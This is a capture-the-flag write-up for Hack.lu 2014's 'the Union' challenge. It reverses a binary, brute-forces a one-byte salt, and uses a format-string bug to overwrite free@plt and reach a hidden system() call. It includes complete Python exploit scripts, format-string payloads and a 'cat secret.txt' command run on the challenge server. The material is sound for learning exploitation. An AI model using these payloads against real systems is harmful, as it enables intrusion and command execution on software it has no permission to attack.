### Solved by barrebas

Hack.lu 2014 was a very fun, western-themed CTF. For `the Union`, we were given an executable and a place to connect to. We need to find `secret.txt` and the hint is that "not everything is what it seems". Uh-huh. 

![](/images/2014/hack.lu/theunion/00.png)

Upon connecting, the program asks for the union's slogan and secret word:

```bash
bas@tritonal:~$ nc wildwildweb.fluxfingers.net 1423
	Welcome to 
 _   _                        _             _     
| |_| |__   ___   _   _ _ __ (_) ___  _ __ ( )___ 
| __| '_ \ / _ \ | | | | '_ \| |/ _ \| '_ \|// __|
| |_| | | |  __/ | |_| | | | | | (_) | | | | \__ \
 \__|_| |_|\___|  \__,_|_| |_|_|\___/|_| |_| |___/

			mining archive.

Please give the unions slogan and secret word:
```

We have neither. Time to fire up the binary in `gdb`. I also uploaded it to [the Retargetable Decompiler](http://decompiler.fit.vutbr.cz/decompilation/). The binary looks for a file called `salt.txt`. I made a file with only `0` as contents. Using the output of the Retargetable Decompiler, I spotted the `strcmp` that checks the user-supplied password. It looks like it checks against `%,(!x4!%<.>`, but I figured that it does a bit of decoding. In `gdb`, I set a breakpoint on `strcmp`:

```bash
gdb-peda$ p strcmp
$1 = {<text variable, no debug info>} 0x8048660 <strcmp@plt>
gdb-peda$ b *0x8048660
Breakpoint 1 at 0x8048660
gdb-peda$ r
...snip...
[------------------------------------stack-------------------------------------]
0000| 0xffffd44c --> 0x80489c9 (test   eax,eax)
0004| 0xffffd450 --> 0xffffd497 ("BLEH")
0008| 0xffffd454 --> 0x804c818 ("gold>silver0\n")
0012| 0xffffd458 --> 0xc ('\x0c')
0016| 0xffffd45c --> 0xf7fbb000 --> 0x1a6da8 
0020| 0xffffd460 --> 0x4 
0024| 0xffffd464 --> 0xb ('\x0b')
0028| 0xffffd468 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048660 in strcmp@plt ()
```

So the slogan seems to be `gold>silver`, and then the contents of `salt.txt` is appended. But how do we know what `salt.txt` contains on the remote server? I had another looks at the output of the Decompiler, and this bit stuck out:

![](/images/2014/hack.lu/theunion/01.png)

Only the first byte of `salt.txt` is used! This makes it easy to bruteforce it. 

```python
#!/usr/bin/python
from socket import *

s=socket(AF_INET, SOCK_STREAM)
s.connect(('wildwildweb.fluxfingers.net', 1423))

print s.recv(1024)
print s.recv(256)

for x in range(256):
        s.send('gold>silver'+chr(x)+'\n')
        print s.recv(256)
s.close()
```

This led us to finding that the full password is `gold>silverb`. Nice! Next, we where presented with a menu:

```bash
	Welcome to 
 _   _                        _             _     
| |_| |__   ___   _   _ _ __ (_) ___  _ __ ( )___ 
| __| '_ \ / _ \ | | | | '_ \| |/ _ \| '_ \|// __|
| |_| | | |  __/ | |_| | | | | | (_) | | | | \__ \
 \__|_| |_|\___|  \__,_|_| |_|_|\___/|_| |_| |___/

			mining archive.

Please give the unions slogan and secret word:
gold>silverb
Correct slogan.

1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
```

After poking around, I found a string format exploit in the `Add mine` and `Show profit` function. This little bit shows we have control over the format string:

```bash
Do you want to see the profit?
Location: %11$x-%12$x
Type: AABBBBCCCC
y/n
y
Profit for location:
42424242-43434343
AABBBBCCCC
666
```

We poked around the binary a bit more and Swappage identified the secret trapdoor function at `0x8049208`. It turns out that we could reach this function also when `99` is entered on the menu:

```bash
99
Ufff! You found our trapdoor.
Ok here you go. Everything in here is not what it seems to be.
If you do not understand this, you are not quite there yet.
```

I wrote a small python script that exploits the string format bug so that it writes the address `0x8049208` to `free@plt`. Next, the script invokes `Delete mine` so that `free()` is called, but this actually points to the trapdoor function. When executing this script locally, I noticed that `/bin/sh` threw an error message, indicating that `system()` is called somehow. But upon examination of the binary, I could not find *any* calls to `system()`, `execve` or even `int 0x80`! What was going on here? `hopper` shed some light on this function:

![](/images/2014/hack.lu/theunion/02.png)

There is a piece of code that is never actually executed when this trapdoor function is called from the menu, the `printf`. Oddly, the rest of the binary uses `putf`. I ran `gdb` and examined the pointer that is used and compare it to `printf`... It wasn't the same! On a hunch, I compared it to `system()`, which did match! So indeed, not everything is what it seems. With this in mind, we can modify the string format exploit. It should write the address of `printf@plt` to `free@plt`, so when a string is freed, `system()` is called with that string as argument. Command execution, here we come!

```python
#!/usr/bin/python

from socket import *
import time

# connect to remote server
s=socket(AF_INET, SOCK_STREAM)
s.connect(('wildwildweb.fluxfingers.net', 1423))

# receive & print banner
time.sleep(1)
print s.recv(1024)
time.sleep(1)

# send passphrase
s.send('gold>silverb\n')
time.sleep(0.05)
print s.recv(512)

# delete all mines, makes it easier later
s.send('3\n')
s.send('y\n')
time.sleep(0.05)
print s.recv(512)
s.send('3\n')
s.send('y\n')
time.sleep(0.05)
print s.recv(512)
s.send('3\n')
s.send('y\n')
time.sleep(0.05)
print s.recv(512)

# add mine, supply a string format argument which
# overwrites the first two bytes of free@plt pointer
time.sleep(0.05)
s.send('1\n')
time.sleep(0.05)
print s.recv(512)
# we need to write the value 0x85e0, which is 34272 
# in decimal
s.send('%34272c%11$hn\n') 
time.sleep(0.05)
print s.recv(512)

# pointer to free@plt
s.send('AA\x14\xb0\x04\x08CCCC\n')
time.sleep(0.05)
print s.recv(512)

# don't care
s.send('666\n')
time.sleep(0.05)
print s.recv(512)

# invoke Show Profit && trigger format string exploit
s.send('4\n')
time.sleep(0.05)
print s.recv(512)
s.send('y\n')

# receive dummy bytes
for i in range(342):
	time.sleep(0.01)
	s.recv(100)
print s.recv(256)

# add mine, supply a string format argument which
# overwrites the last two bytes of free@plt pointer
s.send('1\n')
time.sleep(0.05)
print s.recv(512)

# we need to write the value 0x0804, which is 2052 
# in decimal
s.send('%2052c%11$hn\n') # -> 0x804 in hex
time.sleep(0.05)
print s.recv(512)

# pointer to free@plt+2
s.send('AA\x16\xb0\x04\x08CCCC\n') 
time.sleep(0.05)
print s.recv(512)

# don't care
s.send('666\n')
time.sleep(0.05)
print s.recv(512)

# invoke Show Profit && trigger format string exploit
s.send('4\n')
time.sleep(0.05)
print s.recv(512)
s.send('n\n')
time.sleep(0.05)
print s.recv(512)
s.send('y\n')
time.sleep(0.05)

# receive extra bytes (from the string format exploit)
print s.recv(2400)

# send payload, in another mine. we're going to delete it 
# right away to call system()
time.sleep(0.05)
s.send('1\n')
time.sleep(0.05)
print s.recv(512)

# shell command goes here
s.send('cat secret.txt 2&>1\n') 
time.sleep(0.05)
print s.recv(512)

# second command
s.send('bleh\n') #0x804b02c
time.sleep(0.05)
print s.recv(512)

# third command
s.send('blah\n')
time.sleep(0.05)
print s.recv(512)

# invoke Delete Mine, which triggers system() which our commands
s.send('3\n')
time.sleep(0.05)
print s.recv(512)
s.send('n\n')
time.sleep(0.05)
print s.recv(512)
s.send('n\n')
time.sleep(0.05)
print s.recv(512)
s.send('y\n')
time.sleep(0.05)
print s.recv(512)

time.sleep(0.05)
print s.recv(512)
	
s.close()
```

After running this exploit, it returns the flag:

```bash
3^JDo you want to delete?
Location: %34272c%11$hn
Type: AA..CCCC
y/n

n^JDo you want to delete?
Location: %2052c%11$hn
Type: AA..CCCC
y/n

n^JDo you want to delete?
Location: cat secret.txt 2&>1
Type: bleh
y/n

y^JFLAG{d1aM0nd>G0lD}
1) Add mine
2) Show mines
3) Delete mine
4) Show profit
5) Exit
id^J
```

The flag is `flag{d1aM0nd>G0lD}`. 
